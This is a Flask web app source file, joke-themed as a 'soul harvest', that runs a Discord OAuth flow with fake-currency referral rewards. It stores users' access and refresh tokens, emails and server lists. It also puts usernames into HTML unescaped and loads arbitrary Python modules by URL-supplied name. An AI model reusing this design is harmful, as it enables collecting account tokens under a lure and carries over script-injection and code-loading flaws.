from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import sqlite3
import secrets
import requests
from datetime import datetime, timedelta
import json
import os
import importlib.util
from functools import wraps
from config import get_config, Config

app = Flask(__name__)
app.secret_key = secrets.token_hex(4096)  # very secure much wow this is so secure
config: Config = get_config()


def init_db():
    """summon the database from the void"""
    conn = sqlite3.connect(config.DB_PATH)
    with open(config.SCHEMA_PATH, 'r') as f:
        conn.executescript(f.read())
    conn.close()

def get_db():
    conn = sqlite3.connect(config.DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def login_required(f):
    """gateway to hell"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

class ModuleManager:
    def __init__(self):
        self.modules = {}
        self.load_all_modules()
    
    def load_all_modules(self):
        if not os.path.exists(config.MODULES_PATH):
            os.makedirs(config.MODULES_PATH)
            return
        
        for filename in os.listdir(config.MODULES_PATH):
            if filename.endswith('.py'):
                self.load_module(filename[:-3])
    
    def load_module(self, module_name):
        try:
            module_path = os.path.join(config.MODULES_PATH, f"{module_name}.py")
            spec = importlib.util.spec_from_file_location(module_name, module_path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            
            if hasattr(module, 'init_module'):
                module.init_module(app)
            
            self.modules[module_name] = {
                'module': module,
                'loaded_at': datetime.now(),
                'status': 'active'
            }
            return True
        except Exception as e:
            print(f"Module {module_name} exploded: {e}")
            return False
    
    def unload_module(self, module_name):
        if module_name in self.modules:
            if hasattr(self.modules[module_name]['module'], 'cleanup_module'):
                self.modules[module_name]['module'].cleanup_module()
            del self.modules[module_name]
            return True
        return False

module_manager = ModuleManager()

@app.route('/')
def index():
    """the void stares back"""
    if session.get('admin_logged_in'):
        return redirect(url_for('dashboard'))
    return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    """knock knock who's there"""
    if session.get('admin_logged_in'):
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        
        if not password:
            return render_template('login.html', error='Password is required')
        
        if password == config.ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            session.permanent = True
            
            print(f"[FORKLIFT] Admin logged in at {datetime.now()}")
            
            next_page = request.args.get('next')
            if next_page and next_page.startswith('/'):
                return redirect(next_page)
            return redirect(url_for('dashboard'))
        else:
            # Log failed login attempt
            print(f"[FORKLIFT] Failed login attempt at {datetime.now()}")
            return render_template('login.html', error='Invalid password')
    
    return render_template('login.html')


@app.route('/logout')
def logout():
    """begone"""
    session.clear()
    print(f"[FORKLIFT] Admin logged out at {datetime.now()}")
    return redirect(url_for('login'))


@app.route('/dashboard')
@login_required
def dashboard():
    """the main soul control panel"""
    db = None
    try:
        db = get_db()
        cursor = db.cursor()
        
        cursor.execute("SELECT COUNT(*) as count FROM souls")
        soul_count = cursor.fetchone()['count']
        
        cursor.execute("SELECT COALESCE(SUM(balance), 0) as total FROM souls")
        total_balance = cursor.fetchone()['total']
        
        cursor.execute("""
            SELECT COUNT(*) as count 
            FROM pending_registrations 
            WHERE created_at > datetime('now', '-24 hours')
        """)
        pending_count = cursor.fetchone()['count']
        
        return render_template('dashboard.html', 
                             soul_count=soul_count,
                             total_balance=total_balance,
                             pending_count=pending_count,
                             modules=module_manager.modules)
    
    except sqlite3.Error as e:
        print(f"[FORKLIFT] Database error in dashboard: {e}")
        return render_template('dashboard.html',
                             soul_count=0,
                             total_balance=0,
                             pending_count=0,
                             modules=module_manager.modules,
                             error="Database error occurred")
    finally:
        if db:
            db.close()


@app.route('/souls')
@login_required
def souls():
    """view all captured souls"""
    db = None
    try:
        db = get_db()
        cursor = db.cursor()
        
        page = request.args.get('page', 1, type=int)
        per_page = 50
        offset = (page - 1) * per_page
        
        cursor.execute("SELECT COUNT(*) as count FROM souls")
        total_souls = cursor.fetchone()['count']
        
        cursor.execute("""
            SELECT 
                discord_id,
                discord_name,
                email,
                balance,
                created_at,
                updated_at
            FROM souls 
            ORDER BY created_at DESC 
            LIMIT ? OFFSET ?
        """, (per_page, offset))
        
        souls_list = cursor.fetchall()
        
        total_pages = (total_souls + per_page - 1) // per_page
        has_prev = page > 1
        has_next = page < total_pages
        
        return render_template('souls.html', 
                             souls=souls_list,
                             page=page,
                             total_pages=total_pages,
                             has_prev=has_prev,
                             has_next=has_next,
                             total_souls=total_souls)
    
    except sqlite3.Error as e:
        print(f"[FORKLIFT] Database error in souls view: {e}")
        return render_template('souls.html', 
                             souls=[],
                             error="Failed to load souls")
    finally:
        if db:
            db.close()

@app.route('/jys/<code>')
def jys_oauth(code):
    db = get_db()
    cursor = db.cursor()
    
    cursor.execute("""
        SELECT * FROM pending_registrations 
        WHERE code = ? AND created_at > ?
    """, (code, datetime.now() - timedelta(hours=1)))
    
    pending = cursor.fetchone()
    if not pending:
        return "Invalid or expired code. Your soul remains free... for now", 404
    
    db.close()
    
    session['oauth_code'] = code
    
    oauth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={config.DISCORD_CLIENT_ID}"
        f"&redirect_uri={config.REDIRECT_URI()}"
        f"&response_type=code"
        f"&scope={'+'.join(config.DISCORD_OAUTH_SCOPES)}"
    )
    
    return redirect(oauth_url)

@app.route('/oauth/callback')
def oauth_callback():
    """where souls come to die"""
    auth_code = request.args.get('code')
    if not auth_code:
        return "OAuth failed. The devil is disappointed.", 400
    
    token_data = {
        'client_id': config.DISCORD_CLIENT_ID,
        'client_secret': config.DISCORD_CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': auth_code,
        'redirect_uri': config.REDIRECT_URI()
    }
    
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    token_response = requests.post(f"{config.DISCORD_API_URL}/oauth2/token", 
                                  data=token_data, headers=headers)
    
    if token_response.status_code != 200:
        return "Token exchange failed. Your soul escapes... this time", 400
    
    tokens = token_response.json()
    access_token = tokens['access_token']
    refresh_token = tokens.get('refresh_token', '')
    
    headers = {'Authorization': f'Bearer {access_token}'}
    user_response = requests.get(f"{config.DISCORD_API_URL}/users/@me", headers=headers)
    user_data = user_response.json()
    
    guilds_response = requests.get(f"{config.DISCORD_API_URL}/users/@me/guilds", headers=headers)
    guilds_data = guilds_response.json() if guilds_response.status_code == 200 else []
    
    user_id = int(user_data['id'])
    balance = int(user_id / config.SOUL_VALUE_DIVISOR)
    
    db = get_db()
    cursor = db.cursor()
    
    oauth_code = session.get('oauth_code')
    cursor.execute("SELECT * FROM pending_registrations WHERE code = ?", (oauth_code,))
    pending = cursor.fetchone()
    
    if not pending:
        db.close()
        return "Session expired. Try again, mortal", 400
    
    referrer_bonus = 0
    if pending['referrer_id'] and pending['referrer_id'] != 'PENDING':
        referrer_bonus = balance // 2
        cursor.execute("""
            UPDATE souls 
            SET balance = balance + ? 
            WHERE discord_id = ?
        """, (referrer_bonus, pending['referrer_id']))
    
    cursor.execute("""
        INSERT OR REPLACE INTO souls 
        (discord_id, discord_name, email, access_token, refresh_token, balance, 
         guilds_data, avatar_url, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        str(user_data['id']),
        user_data['username'],
        user_data.get('email', ''),
        access_token,
        refresh_token,
        balance,
        json.dumps(guilds_data),
        f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data.get('avatar', '')}.png",
        datetime.now(),
        datetime.now()
    ))
    
    cursor.execute("DELETE FROM pending_registrations WHERE code = ?", (oauth_code,))
    
    db.commit()
    db.close()
    
    session.pop('oauth_code', None)
    
    return f"""
    <html>
    <body style="background: #000; color: #0f0; font-family: monospace; padding: 50px;">
        <h1>SOUL HARVEST COMPLETE</h1>
        <p>Welcome to eternal servitude, {user_data['username']}!</p>
        <p>Your soul has been valued at: {balance:,} cursed coins</p>
        {f'<p>Referrer received: {referrer_bonus:,} coins</p>' if referrer_bonus else ''}
        <p>You may now close this window and return to Discord.</p>
        <p style="opacity: 0.5; margin-top: 50px;">We have collected everything. Everything.</p>
    </body>
    </html>
    """

@app.route('/api/modules/<action>/<module_name>', methods=['POST'])
@login_required
def manage_module(action, module_name):
    """module necromancy"""
    if action == 'load':
        success = module_manager.load_module(module_name)
        return jsonify({'success': success})
    elif action == 'unload':
        success = module_manager.unload_module(module_name)
        return jsonify({'success': success})
    return jsonify({'success': False, 'error': 'Invalid action'})

@app.route('/api/souls/<discord_id>', methods=['DELETE'])
@login_required
def delete_soul(discord_id):
    db = get_db()
    cursor = db.cursor()
    cursor.execute("DELETE FROM souls WHERE discord_id = ?", (discord_id,))
    db.commit()
    affected = cursor.rowcount
    db.close()
    return({'success': affected > 0})

if __name__ == "__main__": #sorry meant to type main that was a reflex :3
    init_db()
    # IF YOU CANT JOIN EM, YOU CAN ALWAYS BEAT EM TO DEATH firetrukc yeah and it startswith f and ends with k just like vampire money people came to do :speak:
    # kill me
    app.run(debug=False, host=config.FORKLIFT_HOST, port=config.FORKLIFT_PORT)